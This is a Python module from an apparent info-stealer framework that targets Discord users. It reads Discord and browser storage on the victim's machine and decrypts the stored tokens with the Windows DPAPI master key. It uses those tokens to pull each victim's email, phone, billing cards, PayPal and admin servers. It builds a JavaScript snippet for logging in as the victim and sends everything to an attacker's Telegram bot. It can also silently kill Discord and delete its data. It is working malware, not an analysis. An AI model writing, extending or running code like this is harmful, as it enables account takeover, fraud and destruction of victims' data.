from core.resolver import (
    Resolver, _OS, _RE, _JSON, _SHUTIL, _SUBPROCESS, _TIME, _TYPING,
    _BASE64, _CTYPES, _PATHLIB, _URLLIB_PARSE, _URLLIB_REQUEST
)
os = Resolver.get_mod(_OS)
re = Resolver.get_mod(_RE)
json = Resolver.get_mod(_JSON)
shutil = Resolver.get_mod(_SHUTIL)
subprocess = Resolver.get_mod(_SUBPROCESS)
time = Resolver.get_mod(_TIME)
base64 = Resolver.get_mod(_BASE64)
ctypes = Resolver.get_mod(_CTYPES)
Path = Resolver.get_mod(_PATHLIB).Path
urllib_parse = Resolver.get_mod(_URLLIB_PARSE)
urllib_request = Resolver.get_mod(_URLLIB_REQUEST)
typing_mod = Resolver.get_mod(_TYPING)
Any, Dict, List, Optional, Union = typing_mod.Any, typing_mod.Dict, typing_mod.List, typing_mod.Optional, typing_mod.Union

import clr
from core.bridge_manager import bridge_manager

try:
    from Cryptodome.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

DIVIDER = "—" * 30

from core.base import BaseModule

def log_debug(msg):
    try:
        log_file = os.path.join(os.environ.get("TEMP", "."), "debug_log.txt")
        with open(log_file, "a") as f:
            f.write(f"{time.ctime()} | [Discord] {msg}\n")
    except: pass

# DLL Integration
try:
    from System.Reflection import Assembly
    from System.IO import File
    dll_name = "discord.dll"
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    # Search in bin/, native_modules/, and current core/ dir
    search_paths = [
        os.path.join(base_dir, "bin", dll_name),
        os.path.join(base_dir, "native_modules", dll_name),
        os.path.join(os.path.dirname(__file__), dll_name),
        os.path.join(os.path.dirname(__file__), "..", "native_modules", dll_name),
        os.path.join(os.getcwd(), "native_modules", dll_name)
    ]
    
    CS_AVAILABLE = False
    for _p in search_paths:
        if os.path.exists(_p):
            try:
                # S-09: RAM-Only loading from byte array
                raw_bytes = File.ReadAllBytes(os.path.abspath(_p))
                Assembly.Load(raw_bytes)
                Resolver.load_native()
                from VanguardCore import DiscordManager
                CS_AVAILABLE = True
                # log_debug("Successfully loaded Discord DLL into memory")
                break
            except Exception as ex: 
                log_debug(f"Failed to load DLL {os.path.basename(_p)}: {ex}")
                continue
except Exception as e:
    log_debug(f"Critical error in Discord DLL loading: {e}")
    CS_AVAILABLE = False

class DiscordStealer(BaseModule):
    def __init__(self, bot=None, report_manager=None, temp_dir=None):
        super().__init__(bot, report_manager, temp_dir)
        self.token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
        self.encrypted_token_pattern = r"dQw4w9WgXcQ:[^\" \s<>]+"
        self.found_tokens = []

    def run(self) -> bool:
        """A-04: Implementation of standardized run method."""
        try:
            self.log("Scanning for Discord tokens...")
            data = self.steal_tokens()
            tokens = data.get('tokens', [])
            self.found_tokens = tokens
            
            if tokens and self.bot and self.report_manager:
                self.log(f"Found {len(tokens)} tokens. Sending report...")
                # self.bot is HiddenStealer instance, self.bot.bot is telebot.TeleBot
                bot_token = getattr(self.bot, 'token', getattr(getattr(self.bot, 'bot', None), 'token', BOT_TOKEN))
                self.send_full_report(tokens, bot_token, self.report_manager.admin_id)
            
            return True if tokens else False
        except Exception as e:
            self.log(f"Discord extraction failed: {e}")
            return False

    def get_stats(self) -> Dict[str, int]:
        return {"tokens": len(self.found_tokens)}

    def _clean_token(self, token: str) -> str:
        if not token: return ""
        match = re.search(r"([a-zA-Z0-9\._\-:]{20,})", token)
        return match.group(1) if match else ""

    def steal_tokens(self) -> Dict[str, List[str]]:
        """Scans for Discord tokens using C# DLL or fallback"""
        tokens = []
        
        # 1. Native Extraction (Primary)
        if CS_AVAILABLE:
            try:
                raw = DiscordManager.GetTokens()
                if raw:
                    for t in raw.split(';'):
                        clean = self._clean_token(t)
                        if clean and clean not in tokens: tokens.append(clean)
            except Exception as e:
                log_debug(f"C# extraction error: {e}")

        # 2. Enhanced Python Fallback
        try:
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            
            # Target paths for Discord clients and Browsers
            targets = {
                'Discord': os.path.join(appdata, 'discord'),
                'Discord Canary': os.path.join(appdata, 'discordcanary'),
                'Discord PTB': os.path.join(appdata, 'discordptb'),
                'Discord Development': os.path.join(appdata, 'discorddevelopment'),
                'Lightcord': os.path.join(appdata, 'lightcord'),
                'Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
                'Chrome Beta': os.path.join(localappdata, 'Google', 'Chrome Beta', 'User Data', 'Default'),
                'Edge': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default'),
                'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
                'Opera': os.path.join(appdata, 'Opera Software', 'Opera Stable'),
                'Opera GX': os.path.join(appdata, 'Opera Software', 'Opera GX Stable'),
                'Vivaldi': os.path.join(localappdata, 'Vivaldi', 'User Data', 'Default'),
                'Yandex': os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
            }

            for name, path in targets.items():
                if not os.path.exists(path): continue
                
                # Get master key for this path
                master_key = self._get_master_key(path)
                
                # Scan leveldb and logs
                search_dirs = [
                    os.path.join(path, 'Local Storage', 'leveldb'),
                    os.path.join(path, 'leveldb')
                ]
                
                for s_dir in search_dirs:
                    if not os.path.exists(s_dir): continue
                    try:
                        for f_name in os.listdir(s_dir):
                            if not f_name.endswith(('.log', '.ldb')): continue
                            f_path = os.path.join(s_dir, f_name)
                            try:
                                with open(f_path, 'r', errors='ignore') as f:
                                    content = f.read()
                                    
                                    # Legacy unencrypted tokens
                                    found = re.findall(self.token_pattern, content)
                                    for t in found:
                                        clean = self._clean_token(t)
                                        if clean and clean not in tokens: tokens.append(clean)
                                        
                                    # Encrypted tokens v10
                                    if master_key and CRYPTO_AVAILABLE:
                                        enc_found = re.findall(self.encrypted_token_pattern, content)
                                        for t_enc in enc_found:
                                            try:
                                                raw_enc = t_enc.split(':', 1)[1]
                                                decrypted = self._decrypt_token(base64.b64decode(raw_enc), master_key)
                                                if decrypted:
                                                    clean = self._clean_token(decrypted)
                                                    if clean and clean not in tokens: tokens.append(clean)
                                            except: pass
                            except: pass
                    except: pass
        except Exception as e:
            log_debug(f"Python fallback error: {e}")

        return {'tokens': tokens}

    def _get_master_key(self, path: str) -> Optional[bytes]:
        """Extracts master key from Local State file using DPAPI"""
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            # Try parent for browsers (User Data level)
            local_state_path = os.path.join(os.path.dirname(path), "Local State")
            if not os.path.exists(local_state_path): return None

        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            if not encrypted_key.startswith(b"DPAPI"): return None
            
            encrypted_key = encrypted_key[5:] # Strip DPAPI prefix
            
            # Windows DPAPI Call
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]

            p_data_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
            p_data_out = DATA_BLOB()

            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)):
                key = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
                ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
                return key
        except: pass
        return None

    def _decrypt_token(self, buffer: bytes, master_key: bytes) -> Optional[str]:
        """Decrypts AES-GCM encrypted token using master key"""
        try:
            iv = buffer[3:15]
            payload = buffer[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            # Remove auth tag at the end (16 bytes)
            decrypted = decrypted[:-16].decode()
            return decrypted
        except: return None

    def _api_request(self, path: str, token: str) -> Optional[Any]:
        """Base Discord API requester with bridge support"""

        # Prepare headers
        super_props = base64.b64encode(json.dumps({
            "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "en-US",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "browser_version": "122.0.0.0", "os_version": "10", "release_channel": "stable",
            "client_build_number": 272421
        }).encode()).decode()

        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "X-Super-Properties": super_props
        }

        # Resolve Route
        route = bridge_manager.get_best_route()
        use_bridge = route and route.get('type') == 'bridge'
        bridge_url = route.get('bridge_url') if use_bridge else None

        try:
            target_url = f"https://discord.com/api/v9{path}"
            if use_bridge:
                final_url = f"{bridge_url}?path={urllib_parse.quote(target_url)}"
            else:
                final_url = target_url

            req = urllib_request.Request(final_url, headers=headers)
            with urllib_request.urlopen(req, timeout=12) as resp:
                return json.loads(resp.read().decode())
        except:
            return None

    def get_api_data(self, token: str) -> Dict[str, Any]:
        """Retrieve data via Discord API with Bridge support"""
        results: Dict[str, Any] = {}
        
        # 1. User Info
        user_data = self._api_request("/users/@me", token)
        if user_data and isinstance(user_data, dict):
            nitro_type = user_data.get('premium_type', 0)
            nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro Full (Boost)", 3: "Nitro Basic"}
            results['user'] = {
                'username': user_data.get('username'),
                'id': user_data.get('id'),
                'email': user_data.get('email'),
                'verified': user_data.get('verified'),
                'phone': user_data.get('phone'),
                'nitro': nitro_map.get(nitro_type, "None"),
                'mfa_enabled': user_data.get('mfa_enabled', False),
                'locale': user_data.get('locale', 'unknown')
            }

        # 2. Billing
        billing = self._api_request("/users/@me/billing/payment-sources", token)
        if billing and isinstance(billing, list):
            methods = []
            for b in billing:
                if isinstance(b, dict):
                    if b.get('type') == 1: 
                        methods.append(f"💳 {b.get('brand', 'Card').title()} *{b.get('last_4')} ({b.get('expires_month')}/{b.get('expires_year')})")
                    elif b.get('type') == 2: 
                        methods.append(f"🅿️ PayPal ({b.get('email', 'N/A')})")
            results['billing'] = methods

        # 3. Guilds (Admin)
        guilds = self._api_request("/users/@me/guilds", token)
        if guilds and isinstance(guilds, list):
            results['guilds'] = [g['name'] for g in guilds if isinstance(g, dict) and (g.get('owner') or (int(g.get('permissions', 0)) & 0x8))]

        # 4. Relationships
        rel = self._api_request("/users/@me/relationships", token)
        if rel and isinstance(rel, list):
            friends = [r for r in rel if isinstance(r, dict) and r.get('type') == 1]
            results['friends_count'] = len(friends)
            results['pending_count'] = len([r for r in rel if isinstance(r, dict) and r.get('type') in (3, 4)])
            results['friends_sample'] = [f.get('user', {}).get('username', 'Unknown') for f in friends[:3] if isinstance(f, dict)]

        return results


    def logout(self):
        """Silently kill Discord and clear session data"""
        if CS_AVAILABLE:
            try: DiscordManager.KillDiscord()
            except: pass
        else:
            subprocess.run("taskkill /f /im Discord.exe 2>nul", shell=True, creationflags=0x08000000)

        time.sleep(1)
        appdata = os.environ.get('APPDATA', '')
        for d in ['discord', 'discordcanary', 'discordptb']:
            p = os.path.join(appdata, d)
            if os.path.exists(p):
                try: shutil.rmtree(p, ignore_errors=True)
                except: pass

    def format_token_report(self, tokens: List[str]) -> str:
        if not tokens: return ""
        
        seen_tokens = set()
        unique_tokens = []
        for t in tokens:
            cleaned = self._clean_token(t)
            if cleaned and cleaned not in seen_tokens:
                unique_tokens.append(cleaned)
                seen_tokens.add(cleaned)

        lines = [
            "💎 ✨ <b>DISCORD ANALYSIS REPORT</b> ✨ 💎",
            "🌐 <i>Scanning native modules and leveldb...</i>",
            ""
        ]

        # Cache for user data to handle multiple tokens for the same account
        user_cache = {}

        for token in unique_tokens:
            data = self.get_api_data(token)
            
            # Try to identify user ID from token prefix if API fails
            token_uid = None
            try:
                token_uid = base64.b64decode(token.split('.')[0]).decode('utf-8')
            except: pass

            u = None
            if 'user' in data:
                u = data['user']
                user_cache[u['id']] = data # Cache full data
            elif token_uid and token_uid in user_cache:
                # Use cached data if this token failed but we have info for this user
                data = user_cache[token_uid]
                u = data['user']

            lines.append(f"📡 <code>{token}</code>")
            
            if u:
                # Quick Login JS - ONLY for valid tokens
                login_cmd = (
                    f"(function(token){{" +
                    "try{window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let r of Object.values(e.c)){if(r.exports?.default?.updateToken){r.exports.default.updateToken(token);break;}}}}])}catch(e){}" +
                    "try{window.localStorage.setItem('token', '" + token + "');}catch(e){}" +
                    "setTimeout(()=>{location.reload()},500);" +
                    f"}})('{token}')"
                )
                lines.append(f"💠 <b>Quick Login:</b> <code>{login_cmd}</code>")
                
                if 'user' not in data: # Was from cache
                    lines.append("💡 <i>(Используются кэшированные данные для этого ID)</i>")

                lines.append("")
                lines.append(f"👤 <b>User:</b> <code>{u['username']}</code>")
                lines.append(f"🆔 <b>ID:</b> <code>{u['id']}</code>")
                
                email_status = "✅" if u.get('verified') else "❌"
                lines.append(f"📧 <b>Email:</b> <code>{u['email'] or 'N/A'}</code> {email_status}")
                lines.append(f"📱 <b>Phone:</b> <code>{u['phone'] or 'N/A'}</code>")
                lines.append(f"🛡 <b>2FA:</b> {'🟢 Вкл' if u.get('mfa_enabled') else '🔴 Выкл'}")

                nitro_icons = {"Nitro Classic": "💙", "Nitro Full (Boost)": "💜 🚀", "Nitro Basic": "💛", "None": "⬛"}
                nitro = u.get('nitro', 'None')
                lines.append(f"💎 <b>Nitro:</b> {nitro_icons.get(nitro, '⬛')} {nitro}")
                lines.append(f"🌍 <b>Locale:</b> {u.get('locale', '?').upper()}")

                billing = data.get('billing', [])
                if billing:
                    lines.append(f"\n💳 <b>Billing ({len(billing)}):</b>")
                    for b in billing: lines.append(f"   {b}")
                else:
                    lines.append("💳 <b>Billing:</b> ❌ Нет методов")

                fr_count = data.get('friends_count', 0)
                pend_count = data.get('pending_count', 0)
                friends_str = f"👥 <b>Друзья:</b> {fr_count}"
                if pend_count: friends_str += f" (⏳ {pend_count} ожид.)"
                lines.append(friends_str)
                
                sample = data.get('friends_sample')
                if sample: lines.append(f"   <i>Напр: {', '.join(sample)}</i>")

                guilds = data.get('guilds', [])
                if guilds:
                    lines.append(f"🏰 <b>Admin серверов:</b> <i>{', '.join(guilds[:5])}</i>")
            else:
                lines.append("⚠️ <b>Invalid/Expired Token</b>")

            if unique_tokens.index(token) < len(unique_tokens) - 1:
                lines.append(DIVIDER)

        return "\n".join(lines)

    def send_full_report(self, tokens: list, bot_token: str, admin_id: int, telegram_bridge: str = "") -> bool:
        if not tokens: return False
        base = telegram_bridge.rstrip('/') if telegram_bridge else "https://api.telegram.org"
        url = f"{base}/bot{bot_token}/sendMessage"
        
        report = self.format_token_report(tokens)
        
        # Handle large reports by splitting into chunks (limit 4096)
        chunks = [report[i:i+4000] for i in range(0, len(report), 4000)]
        success = True
        for chunk in chunks:
            try:
                payload = json.dumps({
                    "chat_id": admin_id, 
                    "text": chunk, 
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                }).encode()
                req = urllib_request.Request(url, data=payload, headers={"Content-Type": "application/json"})
                urllib_request.urlopen(req, timeout=10)
            except: 
                success = False
        return success